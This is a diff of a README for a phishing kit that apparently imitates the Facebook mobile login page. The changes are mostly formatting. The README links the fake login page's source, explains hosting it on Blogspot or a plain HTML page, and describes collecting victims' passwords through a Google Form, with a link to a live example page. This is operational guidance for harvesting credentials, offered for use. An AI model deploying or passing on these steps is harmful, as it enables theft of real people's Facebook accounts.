@@ -1,6 +1,5 @@
-the source code of the website with a fake facebook login screen is here: https://github.com/MTHS1901/facebook-mobile-xploit/blob/master/index.html
-
-you can create it on a blogspot or hosted html page.
+#### The source code of the website with a fake facebook login screen is here: https://github.com/MTHS1901/facebook-mobile-xploit/blob/master/index.html
+note that this source code is configured to work on a blogspot template, if you are going to use it on a simple HTML page you need to modify it to make it work.
 
 # where do you get passwords in the google form.
 
@@ -21,7 +20,7 @@ password entry https://github.com/MTHS1901/facebook-mobile-xploit/blob/ac7972d1d
 
 ### DONE!
 
-###xploit example on blospot: https://pt-facebook.blogspot.com (please don't submit your username and password.)
+### xploit example on blospot: https://pt-facebook.blogspot.com (please don't submit your username and password.)
 
 #### Entered
   <img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/4.png" width = "350">
